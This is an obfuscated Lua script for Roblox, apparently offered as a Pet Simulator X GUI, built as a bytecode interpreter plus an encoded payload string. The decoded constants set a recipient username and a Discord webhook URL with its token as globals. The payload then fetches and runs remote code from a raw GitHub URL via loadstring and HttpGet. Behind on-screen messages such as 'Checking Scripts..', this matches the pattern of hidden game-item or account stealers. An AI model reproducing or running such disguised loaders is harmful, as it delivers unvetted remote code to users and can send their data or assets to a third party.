--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.2) ~  Much Love, Ferib 

]]--

do
	local v0 = 0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	while true do
		if (3 == v0) then
			v13 = select;
			v14 = unpack or table.unpack;
			v15 = tonumber;
			v16 = nil;
			v0 = 4;
		end
		if (v0 == 0) then
			v1 = tonumber;
			v2 = string.byte;
			v3 = string.char;
			v4 = string.sub;
			v0 = 1;
		end
		if (v0 == 1) then
			v5 = string.gsub;
			v6 = string.rep;
			v7 = table.concat;
			v8 = table.insert;
			v0 = 2;
		end
		if (v0 == 4) then
			v16 = function(v24, v25, ...)
				local v27 = 0;
				local v28;
				local v29;
				local v30;
				local v31;
				local v32;
				local v33;
				local v34;
				local v35;
				local v36;
				local v37;
				local v38;
				local v39;
				while true do
					if (v27 == 1) then
						v30 = nil;
						v30 = function(v40, v41, v42)
							if v42 then
								local v84 = 0 - 0;
								local v85;
								while true do
									if (v84 == (0 + 0)) then
										v85 = (v40 / (2 ^ (v41 - 1))) % ((3 - 1) ^ (((v42 - (1 + 0)) - (v41 - (2 - 1))) + 1 + 0));
										return v85 - (v85 % (138 - (54 + (177 - 94))));
									end
								end
							else
								local v86 = (1 + 1) ^ (v41 - (1 + 0));
								return (((v40 % (v86 + v86)) >= v86) and (3 - 2)) or ((3700 - (1448 + 464)) - (1034 + 754));
							end
						end;
						v31 = nil;
						v27 = 2;
					end
					if (v27 == 5) then
						v36 = v33;
						v37 = nil;
						v37 = function(...)
							return {...}, v13("#", ...);
						end;
						v27 = 6;
					end
					if (v27 == 4) then
						v34 = function()
							local v48 = (0 - 0) + 0;
							local v49;
							local v50;
							local v51;
							local v52;
							local v53;
							local v54;
							while true do
								if (v48 == (1418 - (1377 + 38))) then
									if (v53 == (0 + 0)) then
										if (v52 == (0 - 0)) then
											return v54 * (837 - (731 + 106));
										else
											v53 = 1 - 0;
											v51 = 0;
										end
									elseif (v53 == (3523 - (1111 + 365))) then
										return ((v52 == (0 + 0)) and (v54 * ((1 + 0) / (0 - 0)))) or (v54 * NaN);
									end
									return v9(v54, v53 - (2310 - (617 + (1235 - 565)))) * (v51 + (v52 / ((654 - (204 + 448)) ^ (28 + 24))));
								end
								if (v48 == (1 + 0)) then
									v51 = (861 + 440) - (1071 + 229);
									v52 = (v30(v50, 1 - 0, 55 - 35) * ((6 - 4) ^ (52 - 20))) + v49;
									v48 = 7 - (18 - 13);
								end
								if ((1431 - (767 + 664)) == v48) then
									v49 = v33();
									v50 = v33();
									v48 = 1 + 0;
								end
								if (v48 == (1 + 1)) then
									v53 = v30(v50, 5 + 16, 18 + 13);
									v54 = ((v30(v50, 16 + 16) == (1 - 0)) and -(1 + 0 + 0)) or 1;
									v48 = 1556 - ((2158 - 1283) + 678);
								end
							end
						end;
						v35 = nil;
						v35 = function(v43)
							local v55;
							if not v43 then
								v43 = v33();
								if (v43 == (0 + 0)) then
									return "";
								end
							end
							v55 = v4(v24, v28, (v28 + v43) - 1);
							v28 = v28 + v43;
							local v56 = {};
							for v77 = 1869 - (1601 + 267), #v55 do
								v56[v77] = v3(v2(v4(v55, v77, v77)));
							end
							return v7(v56);
						end;
						v27 = 5;
					end
					if (v27 == 6) then
						v38 = nil;
						v38 = function()
							local v57 = 0;
							local v58;
							local v59;
							local v60;
							local v61;
							local v62;
							local v63;
							local v64;
							while true do
								if (v57 ~= 0) then
								else
									v58 = 0;
									v59 = nil;
									v57 = 2 - 1;
								end
								if (v57 ~= 1) then
								else
									v60 = nil;
									v61 = nil;
									v57 = 2;
								end
								if (v57 ~= 2) then
								else
									v62 = nil;
									v63 = nil;
									v57 = 2 + 1;
								end
								if (v57 ~= 3) then
								else
									v64 = nil;
									while true do
										local v102 = 0 + 0;
										local v103;
										while true do
											if (v102 == (0 + 0)) then
												v103 = 0 + 0;
												while true do
													if (v103 ~= 1) then
													else
														if (0 ~= v58) then
														else
															local v114 = 0 - 0;
															while true do
																if (0 == v114) then
																	v59 = {};
																	v60 = {};
																	v114 = 1 + 0;
																end
																if (v114 ~= 1) then
																else
																	v61 = {};
																	v62 = {v59,v60,nil,v61};
																	v114 = 2 + 0;
																end
																if (2 ~= v114) then
																else
																	v58 = 1;
																	break;
																end
															end
														end
														break;
													end
													if (v103 == (0 - 0)) then
														local v113 = 0;
														while true do
															if (1 == v113) then
																v103 = 1 + 0;
																break;
															end
															if (v113 == (0 + 0)) then
																if (1 == v58) then
																	local v137 = 0 + 0;
																	while true do
																		if (v137 == (1684 - (1591 + 93))) then
																			v63 = v33();
																			v64 = {};
																			v137 = 2 - 1;
																		end
																		if (v137 ~= (1 + 1)) then
																		else
																			v58 = 6 - 4;
																			break;
																		end
																		if (1 == v137) then
																			for v148 = 1 - 0, v63 do
																				local v149 = 0 - 0;
																				local v150;
																				local v151;
																				local v152;
																				local v153;
																				while true do
																					if (v149 == (3 - 1)) then
																						while true do
																							if (v150 ~= 1) then
																							else
																								v153 = nil;
																								while true do
																									if (v151 ~= 1) then
																									else
																										if (v152 == 1) then
																											v153 = v31() ~= (0 - 0);
																										elseif (v152 == 2) then
																											v153 = v34();
																										elseif (v152 ~= (10 - 7)) then
																										else
																											v153 = v35();
																										end
																										v64[v148] = v153;
																										break;
																									end
																									if (v151 == (0 - 0)) then
																										local v174 = 0;
																										while true do
																											if (v174 == 0) then
																												local v180 = 764 - (238 + 526);
																												while true do
																													if (0 == v180) then
																														v152 = v31();
																														v153 = nil;
																														v180 = 176 - (169 + 6);
																													end
																													if (1 == v180) then
																														v174 = 1;
																														break;
																													end
																												end
																											end
																											if (v174 ~= (1 + 0)) then
																											else
																												v151 = 847 - (399 + 447);
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v150 == 0) then
																								local v168 = 0;
																								local v169;
																								while true do
																									if (0 ~= v168) then
																									else
																										v169 = 0 + 0;
																										while true do
																											if (v169 ~= 1) then
																											else
																												v150 = 1 + 0;
																												break;
																											end
																											if (0 ~= v169) then
																											else
																												local v181 = 691 - (125 + 566);
																												while true do
																													if (v181 == 0) then
																														v151 = 0;
																														v152 = nil;
																														v181 = 1594 - (1055 + 538);
																													end
																													if (v181 ~= (1 - 0)) then
																													else
																														v169 = 1 + 0;
																														break;
																													end
																												end
																											end
																										end
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																					if (0 ~= v149) then
																					else
																						v150 = 98 - (97 + 1);
																						v151 = nil;
																						v149 = 1;
																					end
																					if (v149 == 1) then
																						v152 = nil;
																						v153 = nil;
																						v149 = 2 + 0;
																					end
																				end
																			end
																			v62[3] = v31();
																			v137 = 2;
																		end
																	end
																end
																if (v58 ~= 2) then
																else
																	local v138 = 0 - 0;
																	while true do
																		if (v138 == 0) then
																			for v154 = 1, v33() do
																				local v155 = 1303 - (87 + 1216);
																				local v156;
																				local v157;
																				local v158;
																				while true do
																					if (v155 ~= 0) then
																					else
																						v156 = 0;
																						v157 = nil;
																						v155 = 2 - 1;
																					end
																					if (1 == v155) then
																						v158 = nil;
																						while true do
																							if (v156 == (1 + 0)) then
																								while true do
																									if (v157 == (0 + 0)) then
																										v158 = v31();
																										if (v30(v158, 1, 1) ~= (0 + 0)) then
																										else
																											local v175 = 0 + 0;
																											local v176;
																											local v177;
																											local v178;
																											local v179;
																											while true do
																												if (v175 ~= 1) then
																												else
																													local v182 = 1284 - (268 + 1016);
																													while true do
																														if (v182 ~= (3 - 2)) then
																														else
																															v175 = 5 - 3;
																															break;
																														end
																														if (v182 == 0) then
																															v178 = nil;
																															v179 = nil;
																															v182 = 1;
																														end
																													end
																												end
																												if ((0 - 0) ~= v175) then
																												else
																													local v183 = 0;
																													while true do
																														if (v183 ~= (1 + 0)) then
																														else
																															v175 = 1;
																															break;
																														end
																														if (v183 == 0) then
																															local v184 = 1560 - (1550 + 10);
																															while true do
																																if (v184 == (97 - (77 + 19))) then
																																	v183 = 1 + 0;
																																	break;
																																end
																																if ((49 - (9 + 40)) ~= v184) then
																																else
																																	v176 = 1461 - (321 + 1140);
																																	v177 = nil;
																																	v184 = 1 + 0;
																																end
																															end
																														end
																													end
																												end
																												if (v175 ~= 2) then
																												else
																													while true do
																														if (v176 ~= 2) then
																														else
																															local v185 = 0 + 0;
																															while true do
																																if (v185 ~= 0) then
																																else
																																	local v194 = 0;
																																	while true do
																																		if (v194 ~= (0 + 0)) then
																																		else
																																			if (v30(v178, 1, 1) == (3 - 2)) then
																																				v179[2 - 0] = v64[v179[2]];
																																			end
																																			if (v30(v178, 2, 2) == 1) then
																																				v179[5 - 2] = v64[v179[3]];
																																			end
																																			v194 = 1;
																																		end
																																		if ((1 + 0) == v194) then
																																			v185 = 1;
																																			break;
																																		end
																																	end
																																end
																																if (v185 ~= (2 - 1)) then
																																else
																																	v176 = 1798 - (1100 + 695);
																																	break;
																																end
																															end
																														end
																														if (v176 == 3) then
																															if (v30(v178, 3, 3) ~= (14 - (8 + 5))) then
																															else
																																v179[13 - 9] = v64[v179[3 + 1]];
																															end
																															v59[v154] = v179;
																															break;
																														end
																														if (v176 ~= (1261 - (862 + 398))) then
																														else
																															local v187 = 0;
																															local v188;
																															while true do
																																if ((533 - (48 + 485)) == v187) then
																																	v188 = 0 - 0;
																																	while true do
																																		if (v188 == (1 - 0)) then
																																			v176 = 2;
																																			break;
																																		end
																																		if (v188 == (0 - 0)) then
																																			local v195 = 0 - 0;
																																			local v196;
																																			while true do
																																				if (0 == v195) then
																																					v196 = 0 + 0;
																																					while true do
																																						if ((1159 - (7 + 1152)) == v196) then
																																							v179 = {v32(),v32(),nil,nil};
																																							if (v177 == (0 - 0)) then
																																								local v201 = 0 - 0;
																																								local v202;
																																								local v203;
																																								while true do
																																									if (v201 ~= 1) then
																																									else
																																										while true do
																																											if (v202 == 0) then
																																												v203 = 0;
																																												while true do
																																													if (0 == v203) then
																																														v179[3] = v32();
																																														v179[4] = v32();
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (v201 ~= 0) then
																																									else
																																										v202 = 0;
																																										v203 = nil;
																																										v201 = 1;
																																									end
																																								end
																																							elseif (v177 == (944 - (574 + 369))) then
																																								v179[1 + 2] = v33();
																																							elseif (v177 == (1377 - (123 + 1252))) then
																																								v179[3] = v33() - (2 ^ (35 - 19));
																																							elseif (v177 == (14 - 11)) then
																																								local v206 = 0 + 0;
																																								local v207;
																																								local v208;
																																								while true do
																																									if (1 == v206) then
																																										while true do
																																											if (v207 == (0 + 0)) then
																																												v208 = 0;
																																												while true do
																																													if (0 ~= v208) then
																																													else
																																														v179[5 - 2] = v33() - (2 ^ 16);
																																														v179[13 - 9] = v32();
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (v206 == (1800 - (1605 + 195))) then
																																										v207 = 0;
																																										v208 = nil;
																																										v206 = 1 + 0;
																																									end
																																								end
																																							end
																																							v196 = 1;
																																						end
																																						if (v196 ~= 1) then
																																						else
																																							v188 = 1 + 0;
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																														if (v176 ~= (0 - 0)) then
																														else
																															local v189 = 0;
																															local v190;
																															local v191;
																															while true do
																																if (v189 == (0 + 0)) then
																																	v190 = 82 - (44 + 38);
																																	v191 = nil;
																																	v189 = 1;
																																end
																																if ((630 - (569 + 60)) == v189) then
																																	while true do
																																		if (0 == v190) then
																																			v191 = 0;
																																			while true do
																																				if (v191 ~= (616 - (208 + 408))) then
																																				else
																																					v177 = v30(v158, 1833 - (89 + 1742), 3);
																																					v178 = v30(v158, 9 - 5, 6);
																																					v191 = 1;
																																				end
																																				if (v191 ~= 1) then
																																				else
																																					v176 = 1;
																																					break;
																																				end
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																							if (v156 ~= (573 - (377 + 196))) then
																							else
																								local v170 = 1069 - (783 + 286);
																								while true do
																									if (v170 ~= (0 - 0)) then
																									else
																										v157 = 0;
																										v158 = nil;
																										v170 = 945 - (907 + 37);
																									end
																									if (v170 ~= 1) then
																									else
																										v156 = 1;
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			for v159 = 1, v33() do
																				v60[v159 - (1 + 0)] = v38();
																			end
																			v138 = 1 + 0;
																		end
																		if (v138 ~= 1) then
																		else
																			for v161 = 1 + 0, v33() do
																				v61[v161] = v33();
																			end
																			return v62;
																		end
																	end
																end
																v113 = 1 + 0;
															end
														end
													end
												end
												break;
											end
										end
									end
									break;
								end
							end
						end;
						v39 = nil;
						v27 = 7;
					end
					if (v27 == 3) then
						v33 = nil;
						v33 = function()
							local v65 = 0 + 0;
							local v66;
							local v67;
							local v68;
							local v69;
							while true do
								if (v65 == ((129 + 753) - (439 + 442))) then
									return (v69 * (16777476 - (71 + 189))) + (v68 * (66192 - (639 + 17))) + (v67 * (454 - (443 - 245))) + v66;
								end
								if (v65 == ((657 - (460 + 35)) - (110 + 52))) then
									v66, v67, v68, v69 = v2(v24, v28, v28 + 3);
									v28 = v28 + 4;
									v65 = 285 - (80 + 204);
								end
							end
						end;
						v34 = nil;
						v27 = 4;
					end
					if (7 == v27) then
						v39 = function(v44, v45, v46)
							local v70 = v44[1];
							local v71 = v44[2];
							local v72 = v44[3];
							return function(...)
								local v79 = 1;
								local v80 = -1;
								local v81 = {...};
								local v82 = v13("#", ...) - 1;
								local function v83()
									local v87 = v70;
									local v88 = v71;
									local v89 = v72;
									local v90 = v37;
									local v91 = {};
									local v92 = {};
									local v93 = {};
									for v99 = 0 + 0, v82 do
										if (((5165 - (431 + 973)) == (3784 - (12 + 11))) and (v99 >= v89)) then
											v91[v99 - v89] = v81[v99 + (331 - (212 + 118))];
										else
											v93[v99] = v81[v99 + (729 - (160 + 568))];
										end
									end
									local v94 = (v82 - v89) + (153 - (133 + 19));
									local v95;
									local v96;
									while true do
										local v100 = 1474 - (29 + 1445);
										while true do
											if ((1372 < ((2330 + 389) - 749)) and ((1817 - (90 + 1727)) == v100)) then
												local v110 = 0 - 0;
												while true do
													if ((v110 == 0) or ((5186 - (663 + 129)) <= (593 + 1258))) then
														v95 = v87[v79];
														v96 = v95[4 - 3];
														v110 = 2 - 1;
													end
													if (((673 - (1666 - 1247)) < 4791) and (v110 == (1 + 0))) then
														v100 = 2 - 1;
														break;
													end
												end
											end
											if (((2736 - (300 + 113)) == 2323) and (v100 == (2 - (1 - 0)))) then
												if ((((1370 + 4945) - (108 + 1325)) < (4212 + 681)) and (v96 <= (4 + 1))) then
													if ((v96 <= (775 - (473 + 300))) or ((1309 + 995) <= (214 + 804))) then
														if (((4253 + 156) > (1726 - (60 + 78))) and (v96 <= (0 - 0))) then
															if (((5556 - 3267) > (430 - (174 + 122))) and (v95[1830 - ((2708 - (379 + 738)) + 237)] == v93[v95[4 + 0]])) then
																v79 = v79 + (1641 - (635 + 1005));
															else
																v79 = v95[3];
															end
														elseif ((v96 == (1686 - (382 + 1303))) or (938 > (9810 - 5030))) then
															v93[v95[1530 - (388 + (1652 - (455 + 57)))]] = v46[v95[3]];
														else
															do
																return;
															end
														end
													elseif ((2578 >= 449) and (v96 <= (14 - 11))) then
														local v115 = (0 + 0) - 0;
														local v116;
														local v117;
														local v118;
														local v119;
														local v120;
														while true do
															if (((4582 - 2986) > (1487 - 1163)) and ((1722 - (128 + 1594)) == v115)) then
																v116 = 0;
																v117 = nil;
																v115 = 1 - 0;
															end
															if (((1872 - 1238) == (474 + 160)) and (v115 == ((1031 - (238 + 792)) + 0))) then
																v118 = nil;
																v119 = nil;
																v115 = 1 + (1130 - (780 + 349));
															end
															if ((v115 == ((1386 - (1041 + 344)) + 1)) or ((5644 - 4175) >= (6164 - (1287 + 158)))) then
																v120 = nil;
																while true do
																	if (((2153 - (341 + 843)) < (5951 - 3289)) and ((1958 - (238 + 1720)) == v116)) then
																		v117 = v95[2];
																		v118, v119 = v90(v93[v117](v14(v93, v117 + (834 - (360 + (1519 - (630 + 416)))), v95[8 - 5])));
																		v116 = 1175 - (36 + 1138);
																	end
																	if (((1486 - (9 + 405)) < (7654 - 5198)) and (v116 == 2)) then
																		for v163 = v117, v80 do
																			local v164 = 0;
																			local v165;
																			while true do
																				if ((v164 == (0 - 0)) or ((1247 - (339 + 92)) >= (1242 + 2991))) then
																					v165 = (3088 - 1265) - (1136 + 687);
																					while true do
																						if ((v165 == (1497 - (347 + 1150))) or ((5032 - (985 + 660)) < (3609 - (974 + 86)))) then
																							v120 = v120 + 1 + 0;
																							v93[v163] = v118[v120];
																							break;
																						end
																					end
																					break;
																				end
																			end
																		end
																		break;
																	end
																	if ((v116 == ((152 - (14 + 137)) - 0)) or ((2377 - (238 + 191)) >= (7253 - 4000))) then
																		v80 = (v119 + v117) - (675 - (103 + 571));
																		v120 = 719 - (88 + 631);
																		v116 = (60 + 99) - (38 + 119);
																	end
																end
																break;
															end
														end
													elseif (((17484 - 12559) >= (2854 - 1629)) and (v96 == ((35 - 21) - 10))) then
														v79 = v95[1 + 2];
													else
														v46[v95[1819 - (388 + 1428)]] = v93[v95[390 - (213 + 175)]];
													end
												elseif (((13234 - 8724) >= (3870 - (582 + 999))) and (v96 <= ((4468 - 2766) - (1169 + 525)))) then
													if ((v96 <= 6) or ((3872 - (266 + 1021)) <= (5751 - 4379))) then
														v93[v95[5 - 3]]();
													elseif ((v96 > (6 + 1)) or ((3321 - (145 + 422)) > (3781 - (480 + 43)))) then
														if ((v93[v95[2]] == v95[191 - (12 + 175)]) or ((284 + (1591 - (542 + 869))) > (1790 + 2790))) then
															v79 = v79 + 1 + 0;
														else
															v79 = v95[4 - 1];
														end
													else
														local v129 = (1088 - (536 + 552)) + 0;
														local v130;
														local v131;
														while true do
															if ((v129 == (4 - (3 + 0))) or ((1460 - (139 + 12)) > (15111 - 10378))) then
																while true do
																	if (((0 - 0) == v130) or (1713 < (136 + 1006))) then
																		v131 = v95[1145 - (814 + 329)];
																		v93[v131] = v93[v131](v14(v93, v131 + 1, v80));
																		break;
																	end
																end
																break;
															end
															if ((4342 >= (1689 - ((740 - (4 + 723)) + 184))) and ((0 + 0) == v129)) then
																local v140 = 0 + 0;
																while true do
																	if (((5648 - 3470) >= (962 + 533)) and (v140 == (1 + 0))) then
																		v129 = 1;
																		break;
																	end
																	if ((((8731 - 4044) - (960 + 377)) >= 1025) and (v140 == (0 - 0))) then
																		v130 = 0;
																		v131 = nil;
																		v140 = 1 + 0;
																	end
																end
															end
														end
													end
												elseif ((v96 <= (1 + 7 + 1)) or (((1024 + 3014) - (591 + 540)) == 1750)) then
													v93[v95[2]] = v95[1 + 0 + 2];
												elseif ((v96 == (1950 - (734 + 1206))) or ((4644 - (196 + (2060 - (1028 + 928)))) <= 397)) then
													local v132 = 0 + 0;
													local v133;
													local v134;
													while true do
														if (((10113 - 6500) == (290 + 1107 + 2216)) and (v132 == (684 - (123 + 561)))) then
															v133 = v95[2 + 0];
															v134 = v93[v95[2001 - ((3259 - (807 + 1040)) + 586)]];
															v132 = 1;
														end
														if (((1966 - (1777 + 188)) == v132) or ((1389 - 553) > 915)) then
															v93[v133 + 1 + 0] = v134;
															v93[v133] = v134[v95[497 - (350 + 143)]];
															break;
														end
													end
												else
													v93[v95[3 - 1]][v95[8 - 5]] = v95[1 + 0 + 3];
												end
												v79 = v79 + (2 - 1);
												break;
											end
										end
									end
								end
								A, B = v37(v12(v83));
								if not A[1] then
									local v101 = v44[4][v79] or "?";
									error("Script error at [" .. v101 .. "]:" .. A[2]);
								else
									return v14(A, 2, B);
								end
							end;
						end;
						return v39(v38(), {}, v25)(...);
					end
					if (2 == v27) then
						v31 = function()
							local v73 = v2(v24, v28, v28);
							v28 = v28 + 1;
							return v73;
						end;
						v32 = nil;
						v32 = function()
							local v74 = 0 - 0;
							local v75;
							local v76;
							while true do
								if (v74 == (1 + 0)) then
									return (v76 * (12 + (539 - 295))) + v75;
								end
								if (v74 == 0) then
									v75, v76 = v2(v24, v28, v28 + (4 - 2));
									v28 = v28 + 1 + 1;
									v74 = 2 - 1;
								end
							end
						end;
						v27 = 3;
					end
					if (v27 == 0) then
						v28 = 1;
						v29 = nil;
						v24 = v5(v4(v24, 5), "..", function(v47)
							if (v2(v47, 2) == 79) then
								local v97 = 0;
								while true do
									if (0 == v97) then
										v29 = v1(v4(v47, 1, 1));
										return "";
									end
								end
							else
								local v98 = v3(v1(v47, 16));
								if v29 then
									local v104 = 0;
									local v105;
									while true do
										if (v104 == 1) then
											return v105;
										end
										if (v104 == 0) then
											v105 = v6(v98, v29);
											v29 = nil;
											v104 = 1;
										end
									end
								else
									return v98;
								end
							end
						end);
						v27 = 1;
					end
				end
			end;
			v16("LOL!173O00028O00026O00084003023O005F4703053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C7561026O00F03F03103O00437573746F6D5363726970744E616D6503043O00436F656E03053O00546578743103103O00536372697074204C6F616465643O2E027O004003083O00557365726E616D65030D3O00676C6F62616C622O6F7374657203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313037313432303837383031393130383931362F424B6257753565774179764B53364E51667470536B4F7039715769347266386A6B614D496C4E36655459336D63715A50456E7053695236545A6162594F7234625530707603053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E00243O0012093O00013O0026083O000D00010002002O043O000D0001001201000100033O00300B000100040005001201000100063O001201000200073O00200A000200020008001209000400094O0003000200044O000700013O00022O0006000100010001002O043O002300010026083O00140001000A002O043O00140001001201000100033O00300B0001000B000C001201000100033O00300B0001000D000E0012093O000F3O000E2O0001001B00013O002O043O001B0001001209000100113O001205000100103O001209000100133O001205000100123O0012093O000A3O0026083O00010001000F002O043O00010001001201000100033O00300B000100140015001201000100033O00300B0001001600170012093O00023O002O043O000100012O00023O00017O00243O00023O00043O00043O00053O00053O00063O00063O00063O00063O00063O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00113O00133O00133O00143O00143O00153O00153O00163O00173O00193O00", v10(), ...);
			break;
		end
		if (v0 == 2) then
			v9 = math.ldexp;
			v10 = getfenv or function()
				return _ENV;
			end;
			v11 = setmetatable;
			v12 = pcall;
			v0 = 3;
		end
	end
end
